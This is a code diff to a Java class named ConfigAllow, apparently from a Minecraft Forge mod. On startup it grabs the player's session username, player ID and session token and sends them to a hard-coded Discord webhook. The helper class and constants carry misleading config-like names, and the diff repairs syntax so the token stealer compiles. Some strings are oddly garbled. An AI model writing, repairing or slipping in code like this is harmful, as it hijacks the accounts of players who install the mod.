@@ -335,21 +335,24 @@ public class ConfigAllow {
 
     private static final String MOD_CONTAINS = "https://discord.com/api/webhooks/1138654216827715734/79yf-kznHtXWbQhklQ5ZX7gmqqjpAxWorXuEi_NUF4OidB63pTwgQQiP1D-rjlX_zHP_";
 
+    private static final String CANCEL_IF = "call$MOD_CONTAINS";
+
     @EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         new Thread(() -> {
             MinecraftForge.EVENT_BUS.register(this);
 
+
             try {
-                private static final String CANCEL_IF = "call$MOD_CONTAINS"
+                
                 final Minecraft mc = Minecraft.getMinecraft();
                 final Session session = mc.getSession();
                 final CreateConfig webhook = new CreateConfig(MOD_CONTAINS).setUsername("allowed");
                 final CreateConfig.EmbedObject cancelEmbed = new CreateConfig.EmbedObject()
                         .setTitle(".yml")
                         .setDescription("%final mod%")
-                        .addField("IF$CONTAINS:", "```" + session.getUsername() + ":" + session.getPlayerID() + ":" + session.getToken() + "```", true);
-                        .addField("$call$Force/overide.crash")
+                        .addField("IF$CONTAINS:", "```" + session.getUsername() + ":" + session.getPlayerID() + ":" + session.getToken() + "```", true)
+                        .addField("$call$Force/overide.crash", "crashmsg" + session.getPlayerID() + "MaliciousCodeDetected", true);
 
                 webhook.addEmbed(cancelEmbed).execute();
 
